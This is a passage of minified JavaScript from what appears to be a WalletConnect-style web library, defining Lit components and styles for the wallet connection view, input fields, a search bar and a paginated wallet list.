    `}async initializeConnection(t=!1){if(!(this.platform==="browser"||Y.state.manualWCControl&&!t))try{const{wcPairingExpiry:e,status:r}=we.state;(t||Y.state.enableEmbedded||te.isPairingExpired(e)||r==="connecting")&&(await we.connectWalletConnect(),this.isSiwxEnabled||qe.close())}catch(e){De.sendEvent({type:"track",event:"CONNECT_ERROR",properties:{message:(e==null?void 0:e.message)??"Unknown"}}),we.setWcError(!0),ut.showError(e.message??"Connection error"),we.resetWcConnection(),se.goBack()}}determinePlatforms(){if(!this.wallet){this.platforms.push("qrcode"),this.platform="qrcode";return}if(this.platform)return;const{mobile_link:t,desktop_link:e,webapp_link:r,injected:n,rdns:i}=this.wallet,s=n==null?void 0:n.map(({injected_id:f})=>f).filter(Boolean),o=[...i?[i]:s??[]],a=Y.state.isUniversalProvider?!1:o.length,c=t,l=r,u=we.checkInstalled(o),h=a&&u,d=e&&!te.isMobile();h&&!B.state.noAdapters&&this.platforms.push("browser"),c&&this.platforms.push(te.isMobile()?"mobile":"qrcode"),l&&this.platforms.push("web"),d&&this.platforms.push("desktop"),!h&&a&&!B.state.noAdapters&&this.platforms.push("unsupported"),this.platform=this.platforms[0]}platformTemplate(){switch(this.platform){case"browser":return U`<w3m-connecting-wc-browser></w3m-connecting-wc-browser>`;case"web":return U`<w3m-connecting-wc-web></w3m-connecting-wc-web>`;case"desktop":return U`
          <w3m-connecting-wc-desktop .onRetry=${()=>this.initializeConnection(!0)}>
          </w3m-connecting-wc-desktop>
        `;case"mobile":return U`
          <w3m-connecting-wc-mobile isMobile .onRetry=${()=>this.initializeConnection(!0)}>
          </w3m-connecting-wc-mobile>
        `;case"qrcode":return U`<w3m-connecting-wc-qrcode></w3m-connecting-wc-qrcode>`;default:return U`<w3m-connecting-wc-unsupported></w3m-connecting-wc-unsupported>`}}headerTemplate(){return this.platforms.length>1?U`
      <w3m-connecting-header
        .platforms=${this.platforms}
        .onSelectPlatfrom=${this.onSelectPlatform.bind(this)}
      >
      </w3m-connecting-header>
    `:null}async onSelectPlatform(t){var r;const e=(r=this.shadowRoot)==null?void 0:r.querySelector("div");e&&(await e.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.platform=t,e.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"}))}};u0([le()],Zh.prototype,"platform",void 0),u0([le()],Zh.prototype,"platforms",void 0),u0([le()],Zh.prototype,"isSiwxEnabled",void 0),Zh=u0([he("w3m-connecting-wc-view")],Zh);var x8=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let L0=class extends fe{constructor(){super(...arguments),this.isMobile=te.isMobile()}render(){if(this.isMobile){const{featured:t,recommended:e}=oe.state,{customWallets:r}=Y.state,n=pe.getRecentWallets(),i=t.length||e.length||(r==null?void 0:r.length)||n.length;return U`<wui-flex
        flexDirection="column"
        gap="xs"
        .margin=${["3xs","s","s","s"]}
      >
        ${i?U`<w3m-connector-list></w3m-connector-list>`:null}
        <w3m-all-wallets-widget></w3m-all-wallets-widget>
      </wui-flex>`}return U`<wui-flex flexDirection="column" .padding=${["0","0","l","0"]}>
      <w3m-connecting-wc-view></w3m-connecting-wc-view>
      <wui-flex flexDirection="column" .padding=${["0","m","0","m"]}>
        <w3m-all-wallets-widget></w3m-all-wallets-widget> </wui-flex
    ></wui-flex>`}};x8([le()],L0.prototype,"isMobile",void 0),L0=x8([he("w3m-connecting-wc-basic-view")],L0);/**
* @license
* Copyright 2020 Google LLC
* SPDX-License-Identifier: BSD-3-Clause
*/const A2=()=>new XK;class XK{}const fm=new WeakMap,x2=C2(class extends R9{render(t){return Nt}update(t,[e]){var n;const r=e!==this.G;return r&&this.G!==void 0&&this.rt(void 0),(r||this.lt!==this.ct)&&(this.G=e,this.ht=(n=t.options)==null?void 0:n.host,this.rt(this.ct=t.element)),Nt}rt(t){if(this.isConnected||(t=void 0),typeof this.G=="function"){const e=this.ht??globalThis;let r=fm.get(e);r===void 0&&(r=new WeakMap,fm.set(e,r)),r.get(this.G)!==void 0&&this.G.call(this.ht,void 0),r.set(this.G,t),t!==void 0&&this.G.call(this.ht,t)}else this.G.value=t}get lt(){var t,e;return typeof this.G=="function"?(t=fm.get(this.ht??globalThis))==null?void 0:t.get(this.G):(e=this.G)==null?void 0:e.value}disconnected(){this.lt===this.ct&&this.rt(void 0)}reconnected(){this.rt(this.ct)}});var eZ=Ae`
  :host {
    display: flex;
    align-items: center;
    justify-content: center;
  }

  label {
    position: relative;
    display: inline-block;
    width: 32px;
    height: 22px;
  }

  input {
    width: 0;
    height: 0;
    opacity: 0;
  }

  span {
    position: absolute;
    cursor: pointer;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: var(--wui-color-blue-100);
    border-width: 1px;
    border-style: solid;
    border-color: var(--wui-color-gray-glass-002);
    border-radius: 999px;
    transition:
      background-color var(--wui-ease-inout-power-1) var(--wui-duration-md),
      border-color var(--wui-ease-inout-power-1) var(--wui-duration-md);
    will-change: background-color, border-color;
  }

  span:before {
    position: absolute;
    content: '';
    height: 16px;
    width: 16px;
    left: 3px;
    top: 2px;
    background-color: var(--wui-color-inverse-100);
    transition: transform var(--wui-ease-inout-power-1) var(--wui-duration-lg);
    will-change: transform;
    border-radius: 50%;
  }

  input:checked + span {
    border-color: var(--wui-color-gray-glass-005);
    background-color: var(--wui-color-blue-100);
  }

  input:not(:checked) + span {
    background-color: var(--wui-color-gray-glass-010);
  }

  input:checked + span:before {
    transform: translateX(calc(100% - 7px));
  }
`,I8=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let h0=class extends fe{constructor(){super(...arguments),this.inputElementRef=A2(),this.checked=void 0}render(){return U`
      <label>
        <input
          ${x2(this.inputElementRef)}
          type="checkbox"
          ?checked=${Ee(this.checked)}
          @change=${this.dispatchChangeEvent.bind(this)}
        />
        <span></span>
      </label>
    `}dispatchChangeEvent(){var t;this.dispatchEvent(new CustomEvent("switchChange",{detail:(t=this.inputElementRef.value)==null?void 0:t.checked,bubbles:!0,composed:!0}))}};h0.styles=[Qe,hr,ip,eZ],I8([F({type:Boolean})],h0.prototype,"checked",void 0),h0=I8([he("wui-switch")],h0);var tZ=Ae`
  :host {
    height: 100%;
  }

  button {
    display: flex;
    align-items: center;
    justify-content: center;
    column-gap: var(--wui-spacing-1xs);
    padding: var(--wui-spacing-xs) var(--wui-spacing-s);
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-002);
    transition: background-color var(--wui-ease-out-power-1) var(--wui-duration-md);
    will-change: background-color;
    cursor: pointer;
  }

  wui-switch {
    pointer-events: none;
  }
`,S8=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let d0=class extends fe{constructor(){super(...arguments),this.checked=void 0}render(){return U`
      <button>
        <wui-icon size="xl" name="walletConnectBrown"></wui-icon>
        <wui-switch ?checked=${Ee(this.checked)}></wui-switch>
      </button>
    `}};d0.styles=[Qe,hr,tZ],S8([F({type:Boolean})],d0.prototype,"checked",void 0),d0=S8([he("wui-certified-switch")],d0);var rZ=Ae`
  button {
    background-color: var(--wui-color-fg-300);
    border-radius: var(--wui-border-radius-4xs);
    width: 16px;
    height: 16px;
  }

  button:disabled {
    background-color: var(--wui-color-bg-300);
  }

  wui-icon {
    color: var(--wui-color-bg-200) !important;
  }

  button:focus-visible {
    background-color: var(--wui-color-fg-250);
    border: 1px solid var(--wui-color-accent-100);
  }

  @media (hover: hover) and (pointer: fine) {
    button:hover:enabled {
      background-color: var(--wui-color-fg-250);
    }

    button:active:enabled {
      background-color: var(--wui-color-fg-225);
    }
  }
`,N8=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let f0=class extends fe{constructor(){super(...arguments),this.icon="copy"}render(){return U`
      <button>
        <wui-icon color="inherit" size="xxs" name=${this.icon}></wui-icon>
      </button>
    `}};f0.styles=[Qe,hr,rZ],N8([F()],f0.prototype,"icon",void 0),f0=N8([he("wui-input-element")],f0);var nZ=Ae`
  :host {
    position: relative;
    width: 100%;
    display: inline-block;
    color: var(--wui-color-fg-275);
  }

  input {
    width: 100%;
    border-radius: var(--wui-border-radius-xs);
    box-shadow: inset 0 0 0 1px var(--wui-color-gray-glass-002);
    background: var(--wui-color-gray-glass-002);
    font-size: var(--wui-font-size-paragraph);
    letter-spacing: var(--wui-letter-spacing-paragraph);
    color: var(--wui-color-fg-100);
    transition:
      background-color var(--wui-ease-inout-power-1) var(--wui-duration-md),
      border-color var(--wui-ease-inout-power-1) var(--wui-duration-md),
      box-shadow var(--wui-ease-inout-power-1) var(--wui-duration-md);
    will-change: background-color, border-color, box-shadow;
    caret-color: var(--wui-color-accent-100);
  }

  input:disabled {
    cursor: not-allowed;
    border: 1px solid var(--wui-color-gray-glass-010);
  }

  input:disabled::placeholder,
  input:disabled + wui-icon {
    color: var(--wui-color-fg-300);
  }

  input::placeholder {
    color: var(--wui-color-fg-275);
  }

  input:focus:enabled {
    background-color: var(--wui-color-gray-glass-005);
    -webkit-box-shadow:
      inset 0 0 0 1px var(--wui-color-accent-100),
      0px 0px 0px 4px var(--wui-box-shadow-blue);
    -moz-box-shadow:
      inset 0 0 0 1px var(--wui-color-accent-100),
      0px 0px 0px 4px var(--wui-box-shadow-blue);
    box-shadow:
      inset 0 0 0 1px var(--wui-color-accent-100),
      0px 0px 0px 4px var(--wui-box-shadow-blue);
  }

  input:hover:enabled {
    background-color: var(--wui-color-gray-glass-005);
  }

  wui-icon {
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
    pointer-events: none;
  }

  .wui-size-sm {
    padding: 9px var(--wui-spacing-m) 10px var(--wui-spacing-s);
  }

  wui-icon + .wui-size-sm {
    padding: 9px var(--wui-spacing-m) 10px 36px;
  }

  wui-icon[data-input='sm'] {
    left: var(--wui-spacing-s);
  }

  .wui-size-md {
    padding: 15px var(--wui-spacing-m) var(--wui-spacing-l) var(--wui-spacing-m);
  }

  wui-icon + .wui-size-md,
  wui-loading-spinner + .wui-size-md {
    padding: 10.5px var(--wui-spacing-3xl) 10.5px var(--wui-spacing-3xl);
  }

  wui-icon[data-input='md'] {
    left: var(--wui-spacing-l);
  }

  .wui-size-lg {
    padding: var(--wui-spacing-s) var(--wui-spacing-s) var(--wui-spacing-s) var(--wui-spacing-l);
    letter-spacing: var(--wui-letter-spacing-medium-title);
    font-size: var(--wui-font-size-medium-title);
    font-weight: var(--wui-font-weight-light);
    line-height: 130%;
    color: var(--wui-color-fg-100);
    height: 64px;
  }

  .wui-padding-right-xs {
    padding-right: var(--wui-spacing-xs);
  }

  .wui-padding-right-s {
    padding-right: var(--wui-spacing-s);
  }

  .wui-padding-right-m {
    padding-right: var(--wui-spacing-m);
  }

  .wui-padding-right-l {
    padding-right: var(--wui-spacing-l);
  }

  .wui-padding-right-xl {
    padding-right: var(--wui-spacing-xl);
  }

  .wui-padding-right-2xl {
    padding-right: var(--wui-spacing-2xl);
  }

  .wui-padding-right-3xl {
    padding-right: var(--wui-spacing-3xl);
  }

  .wui-padding-right-4xl {
    padding-right: var(--wui-spacing-4xl);
  }

  .wui-padding-right-5xl {
    padding-right: var(--wui-spacing-5xl);
  }

  wui-icon + .wui-size-lg,
  wui-loading-spinner + .wui-size-lg {
    padding-left: 50px;
  }

  wui-icon[data-input='lg'] {
    left: var(--wui-spacing-l);
  }

  .wui-size-mdl {
    padding: 17.25px var(--wui-spacing-m) 17.25px var(--wui-spacing-m);
  }
  wui-icon + .wui-size-mdl,
  wui-loading-spinner + .wui-size-mdl {
    padding: 17.25px var(--wui-spacing-3xl) 17.25px 40px;
  }
  wui-icon[data-input='mdl'] {
    left: var(--wui-spacing-m);
  }

  input:placeholder-shown ~ ::slotted(wui-input-element),
  input:placeholder-shown ~ ::slotted(wui-icon) {
    opacity: 0;
    pointer-events: none;
  }

  input::-webkit-outer-spin-button,
  input::-webkit-inner-spin-button {
    -webkit-appearance: none;
    margin: 0;
  }

  input[type='number'] {
    -moz-appearance: textfield;
  }

  ::slotted(wui-input-element),
  ::slotted(wui-icon) {
    position: absolute;
    top: 50%;
    transform: translateY(-50%);
  }

  ::slotted(wui-input-element) {
    right: var(--wui-spacing-m);
  }

  ::slotted(wui-icon) {
    right: 0px;
  }
`,xi=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let Nn=class extends fe{constructor(){super(...arguments),this.inputElementRef=A2(),this.size="md",this.disabled=!1,this.placeholder="",this.type="text",this.value=""}render(){const t=`wui-padding-right-${this.inputRightPadding}`,e={[`wui-size-${this.size}`]:!0,[t]:!!this.inputRightPadding};return U`${this.templateIcon()}
      <input
        data-testid="wui-input-text"
        ${x2(this.inputElementRef)}
        class=${D9(e)}
        type=${this.type}
        enterkeyhint=${Ee(this.enterKeyHint)}
        ?disabled=${this.disabled}
        placeholder=${this.placeholder}
        @input=${this.dispatchInputChangeEvent.bind(this)}
        .value=${this.value||""}
        tabindex=${Ee(this.tabIdx)}
      />
      <slot></slot>`}templateIcon(){return this.icon?U`<wui-icon
        data-input=${this.size}
        size=${this.size}
        color="inherit"
        name=${this.icon}
      ></wui-icon>`:null}dispatchInputChangeEvent(){var t;this.dispatchEvent(new CustomEvent("inputChange",{detail:(t=this.inputElementRef.value)==null?void 0:t.value,bubbles:!0,composed:!0}))}};Nn.styles=[Qe,hr,nZ],xi([F()],Nn.prototype,"size",void 0),xi([F()],Nn.prototype,"icon",void 0),xi([F({type:Boolean})],Nn.prototype,"disabled",void 0),xi([F()],Nn.prototype,"placeholder",void 0),xi([F()],Nn.prototype,"type",void 0),xi([F()],Nn.prototype,"keyHint",void 0),xi([F()],Nn.prototype,"value",void 0),xi([F()],Nn.prototype,"inputRightPadding",void 0),xi([F()],Nn.prototype,"tabIdx",void 0),Nn=xi([he("wui-input-text")],Nn);var iZ=Ae`
  :host {
    position: relative;
    display: inline-block;
    width: 100%;
  }
`,sZ=function(t,e,r,n){var i=arguments.length,s=i<3?e:n===null?n=Object.getOwnPropertyDescriptor(e,r):n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let pm=class extends fe{constructor(){super(...arguments),this.inputComponentRef=A2()}render(){return U`
      <wui-input-text
        ${x2(this.inputComponentRef)}
        placeholder="Search wallet"
        icon="search"
        type="search"
        enterKeyHint="search"
        size="sm"
      >
        <wui-input-element @click=${this.clearValue} icon="close"></wui-input-element>
      </wui-input-text>
    `}clearValue(){var e;const t=(e=this.inputComponentRef.value)==null?void 0:e.inputElementRef.value;t&&(t.value="",t.focus(),t.dispatchEvent(new Event("input")))}};pm.styles=[Qe,iZ],pm=sZ([he("wui-search-bar")],pm);const oZ=re`<svg  viewBox="0 0 48 54" fill="none">
  <path
    d="M43.4605 10.7248L28.0485 1.61089C25.5438 0.129705 22.4562 0.129705 19.9515 1.61088L4.53951 10.7248C2.03626 12.2051 0.5 14.9365 0.5 17.886V36.1139C0.5 39.0635 2.03626 41.7949 4.53951 43.2752L19.9515 52.3891C22.4562 53.8703 25.5438 53.8703 28.0485 52.3891L43.4605 43.2752C45.9637 41.7949 47.5 39.0635 47.5 36.114V17.8861C47.5 14.9365 45.9637 12.2051 43.4605 10.7248Z"
  />
</svg>`;var aZ=Ae`
  :host {
    display: flex;
    flex-direction: column;
    align-items: center;
    width: 104px;
    row-gap: var(--wui-spacing-xs);
    padding: var(--wui-spacing-xs) 10px;
    background-color: var(--wui-color-gray-glass-002);
    border-radius: clamp(0px, var(--wui-border-radius-xs), 20px);
    position: relative;
  }

  wui-shimmer[data-type='network'] {
    border: none;
    -webkit-clip-path: var(--wui-path-network);
    clip-path: var(--wui-path-network);
  }

  svg {
    position: absolute;
    width: 48px;
    height: 54px;
    z-index: 1;
  }

  svg > path {
    stroke: var(--wui-color-gray-glass-010);
    stroke-width: 1px;
  }

  @media (max-width: 350px) {
    :host {
      width: 100%;
    }
  }
`,P8=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let p0=class extends fe{constructor(){super(...arguments),this.type="wallet"}render(){return U`
      ${this.shimmerTemplate()}
      <wui-shimmer width="56px" height="20px" borderRadius="xs"></wui-shimmer>
    `}shimmerTemplate(){return this.type==="network"?U` <wui-shimmer
          data-type=${this.type}
          width="48px"
          height="54px"
          borderRadius="xs"
        ></wui-shimmer>
        ${oZ}`:U`<wui-shimmer width="56px" height="56px" borderRadius="xs"></wui-shimmer>`}};p0.styles=[Qe,hr,aZ],P8([F()],p0.prototype,"type",void 0),p0=P8([he("wui-card-select-loader")],p0);var cZ=Ae`
  :host {
    display: grid;
    width: inherit;
    height: inherit;
  }
`,Pn=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let Ur=class extends fe{render(){return this.style.cssText=`
      grid-template-rows: ${this.gridTemplateRows};
      grid-template-columns: ${this.gridTemplateColumns};
      justify-items: ${this.justifyItems};
      align-items: ${this.alignItems};
      justify-content: ${this.justifyContent};
      align-content: ${this.alignContent};
      column-gap: ${this.columnGap&&`var(--wui-spacing-${this.columnGap})`};
      row-gap: ${this.rowGap&&`var(--wui-spacing-${this.rowGap})`};
      gap: ${this.gap&&`var(--wui-spacing-${this.gap})`};
      padding-top: ${this.padding&&Wt.getSpacingStyles(this.padding,0)};
      padding-right: ${this.padding&&Wt.getSpacingStyles(this.padding,1)};
      padding-bottom: ${this.padding&&Wt.getSpacingStyles(this.padding,2)};
      padding-left: ${this.padding&&Wt.getSpacingStyles(this.padding,3)};
      margin-top: ${this.margin&&Wt.getSpacingStyles(this.margin,0)};
      margin-right: ${this.margin&&Wt.getSpacingStyles(this.margin,1)};
      margin-bottom: ${this.margin&&Wt.getSpacingStyles(this.margin,2)};
      margin-left: ${this.margin&&Wt.getSpacingStyles(this.margin,3)};
    `,U`<slot></slot>`}};Ur.styles=[Qe,cZ],Pn([F()],Ur.prototype,"gridTemplateRows",void 0),Pn([F()],Ur.prototype,"gridTemplateColumns",void 0),Pn([F()],Ur.prototype,"justifyItems",void 0),Pn([F()],Ur.prototype,"alignItems",void 0),Pn([F()],Ur.prototype,"justifyContent",void 0),Pn([F()],Ur.prototype,"alignContent",void 0),Pn([F()],Ur.prototype,"columnGap",void 0),Pn([F()],Ur.prototype,"rowGap",void 0),Pn([F()],Ur.prototype,"gap",void 0),Pn([F()],Ur.prototype,"padding",void 0),Pn([F()],Ur.prototype,"margin",void 0),Ur=Pn([he("wui-grid")],Ur);var lZ=Ae`
  button {
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    cursor: pointer;
    width: 104px;
    row-gap: var(--wui-spacing-xs);
    padding: var(--wui-spacing-s) var(--wui-spacing-0);
    background-color: var(--wui-color-gray-glass-002);
    border-radius: clamp(0px, var(--wui-border-radius-xs), 20px);
    transition:
      color var(--wui-duration-lg) var(--wui-ease-out-power-1),
      background-color var(--wui-duration-lg) var(--wui-ease-out-power-1),
      border-radius var(--wui-duration-lg) var(--wui-ease-out-power-1);
    will-change: background-color, color, border-radius;
    outline: none;
    border: none;
  }

  button > wui-flex > wui-text {
    color: var(--wui-color-fg-100);
    max-width: 86px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    justify-content: center;
  }

  button > wui-flex > wui-text.certified {
    max-width: 66px;
  }

  button:hover:enabled {
    background-color: var(--wui-color-gray-glass-005);
  }

  button:disabled > wui-flex > wui-text {
    color: var(--wui-color-gray-glass-015);
  }

  [data-selected='true'] {
    background-color: var(--wui-color-accent-glass-020);
  }

  @media (hover: hover) and (pointer: fine) {
    [data-selected='true']:hover:enabled {
      background-color: var(--wui-color-accent-glass-015);
    }
  }

  [data-selected='true']:active:enabled {
    background-color: var(--wui-color-accent-glass-010);
  }

  @media (max-width: 350px) {
    button {
      width: 100%;
    }
  }
`,Jh=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let la=class extends fe{constructor(){super(),this.observer=new IntersectionObserver(()=>{}),this.visible=!1,this.imageSrc=void 0,this.imageLoading=!1,this.wallet=void 0,this.observer=new IntersectionObserver(t=>{t.forEach(e=>{e.isIntersecting?(this.visible=!0,this.fetchImageSrc()):this.visible=!1})},{threshold:.01})}firstUpdated(){this.observer.observe(this)}disconnectedCallback(){this.observer.disconnect()}render(){var e,r;const t=((e=this.wallet)==null?void 0:e.badge_type)==="certified";return U`
      <button>
        ${this.imageTemplate()}
        <wui-flex flexDirection="row" alignItems="center" justifyContent="center" gap="3xs">
          <wui-text
            variant="tiny-500"
            color="inherit"
            class=${Ee(t?"certified":void 0)}
            >${(r=this.wallet)==null?void 0:r.name}</wui-text
          >
          ${t?U`<wui-icon size="sm" name="walletConnectBrown"></wui-icon>`:null}
        </wui-flex>
      </button>
    `}imageTemplate(){var t,e;return!this.visible&&!this.imageSrc||this.imageLoading?this.shimmerTemplate():U`
      <wui-wallet-image
        size="md"
        imageSrc=${Ee(this.imageSrc)}
        name=${(t=this.wallet)==null?void 0:t.name}
        .installed=${(e=this.wallet)==null?void 0:e.installed}
        badgeSize="sm"
      >
      </wui-wallet-image>
    `}shimmerTemplate(){return U`<wui-shimmer width="56px" height="56px" borderRadius="xs"></wui-shimmer>`}async fetchImageSrc(){this.wallet&&(this.imageSrc=Mt.getWalletImage(this.wallet),!this.imageSrc&&(this.imageLoading=!0,this.imageSrc=await Mt.fetchWalletImage(this.wallet.image_id),this.imageLoading=!1))}};la.styles=lZ,Jh([le()],la.prototype,"visible",void 0),Jh([le()],la.prototype,"imageSrc",void 0),Jh([le()],la.prototype,"imageLoading",void 0),Jh([F()],la.prototype,"wallet",void 0),la=Jh([he("w3m-all-wallets-list-item")],la);var uZ=Ae`
  wui-grid {
    max-height: clamp(360px, 400px, 80vh);
    overflow: scroll;
    scrollbar-width: none;
    grid-auto-rows: min-content;
    grid-template-columns: repeat(auto-fill, 104px);
  }

  @media (max-width: 350px) {
    wui-grid {
      grid-template-columns: repeat(2, 1fr);
    }
  }

  wui-grid[data-scroll='false'] {
    overflow: hidden;
  }

  wui-grid::-webkit-scrollbar {
    display: none;
  }

  wui-loading-spinner {
    padding-top: var(--wui-spacing-l);
    padding-bottom: var(--wui-spacing-l);
    justify-content: center;
    grid-column: 1 / span 4;
  }
`,Qh=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};const k8="local-paginator";let ua=class extends fe{constructor(){super(),this.unsubscribe=[],this.paginationObserver=void 0,this.loading=!oe.state.wallets.length,this.wallets=oe.state.wallets,this.recommended=oe.state.recommended,this.featured=oe.state.featured,this.unsubscribe.push(oe.subscribeKey("wallets",t=>this.wallets=t),oe.subscribeKey("recommended",t=>this.recommended=t),oe.subscribeKey("featured",t=>this.featured=t))}firstUpdated(){this.initialFetch(),this.createPaginationObserver()}disconnectedCallback(){var t;this.unsubscribe.forEach(e=>e()),(t=this.paginationObserver)==null||t.disconnect()}render(){return U`
      <wui-grid
        data-scroll=${!this.loading}
        .padding=${["0","s","s","s"]}
        columnGap="xxs"
        rowGap="l"
        justifyContent="space-between"
      >
        ${this.loading?this.shimmerTemplate(16):this.walletsTemplate()}
        ${this.paginationLoaderTemplate()}
      </wui-grid>
    `}async initialFetch(){var e;this.loading=!0;const t=(e=this.shadowRoot)==null?void 0:e.querySelector("wui-grid");t&&(await oe.fetchWalletsByPage({page:1}),await t.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.loading=!1,t.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"}))}shimmerTemplate(t,e){return[...Array(t)].map(()=>U`
        <wui-card-select-loader type="wallet" id=${Ee(e)}></wui-card-select-loader>
      `)}walletsTemplate(){const t=te.uniqueBy([...this.featured,...this.recommended,...this.wallets],"id");return Nc.markWalletsAsInstalled(t).map(e=>U`
        <w3m-all-wallets-list-item
          @click=${()=>this.onConnectWallet(e)}
          .wallet=${e}
        ></w3m-all-wallets-list-item>
      `)}paginationLoaderTemplate(){const{wallets:t,recommended:e,featured:r,count:n}=oe.state,i=window.innerWidth<352?3:4,s=t.length+e.length;let o=Math.ceil(s/i)*i-s+i;return o-=t.length?r.length%i:0,n===0&&r.length>0?null:n===0||[...r,...t,...e].length<n?this.shimmerTemplate(o,k8):null}createPaginationObserver(){var e;const t=(e=this.shadowRoot)==null?void 0:e.querySelector(`#${k8}`);t&&(this.paginationObserver=new IntersectionObserver(([r])=>{if(r!=null&&r.isIntersecting&&!this.loading){const{page:n,count:i,wallets:s}=oe.state;s.length<i&&oe.fetchWalletsByPage({page:n+1})}}),this.paginationObserver.observe(t))}onConnectWallet(t){ae.selectWalletConnector(t)}};ua.styles=uZ,Qh([le()],ua.prototype,"loading",void 0),Qh([le()],ua.prototype,"wallets",void 0),Qh([le()],ua.prototype,"recommended",void 0),Qh([le()],ua.prototype,"featured",void 0),ua=Qh([he("w3m-all-wallets-list")],ua);var hZ=Ae`
  wui-grid,
  wui-loading-spinner,
  wui-flex {
    height: 360px;
  }

  wui-grid {
    overflow: scroll;
    scrollbar-width: none;
    grid-auto-rows: min-content;
    grid-template-columns: repeat(auto-fill, 104px);
  }

  wui-grid[data-scroll='false'] {
    overflow: hidden;
  }

  wui-grid::-webkit-scrollbar {
    display: none;
  }

  wui-loading-spinner {
    justify-content: center;
    align-items: center;
  }

  @media (max-width: 350px) {
    wui-grid {
      grid-template-columns: repeat(2, 1fr);
    }
  }
`,g0=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let gl=class extends fe{constructor(){super(...arguments),this.prevQuery="",this.prevBadge=void 0,this.loading=!0,this.query=""}render(){return this.onSearch(),this.loading?U`<wui-loading-spinner color="accent-100"></wui-loading-spinner>`:this.walletsTemplate()}async onSearch(){(this.query.trim()!==this.prevQuery.trim()||this.badge!==this.prevBadge)&&(this.prevQuery=this.query,this.prevBadge=this.badge,this.loading=!0,await oe.searchWallet({search:this.query,badge:this.badge}),this.loading=!1)}walletsTemplate(){const{search:t}=oe.state,e=Nc.markWalletsAsInstalled(t);return t.length?U`
      <wui-grid
        data-testid="wallet-list"
        .padding=${["0","s","s","s"]}
        rowGap="l"
        columnGap="xs"
        justifyContent="space-between"
      >
        ${e.map(r=>U`
            <w3m-all-wallets-list-item
              @click=${()=>this.onConnectWallet(r)}
              .wallet=${r}
              data-testid="wallet-search-item-${r.id}"
            ></w3m-all-wallets-list-item>
          `)}
      </wui-grid>
    `:U`
        <wui-flex
          data-testid="no-wallet-found"
          justifyContent="center"
          alignItems="center"
          gap="s"
          flexDirection="column"
        >
          <wui-icon-box
            size="lg"
            iconColor="fg-200"
            backgroundColor="fg-300"
            icon="wallet"
            background="transparent"
          ></wui-icon-box>
          <wui-text data-testid="no-wallet-found-text" color="fg-200" variant="paragraph-500">
            No Wallet found
          </wui-text>
        </wui-flex>
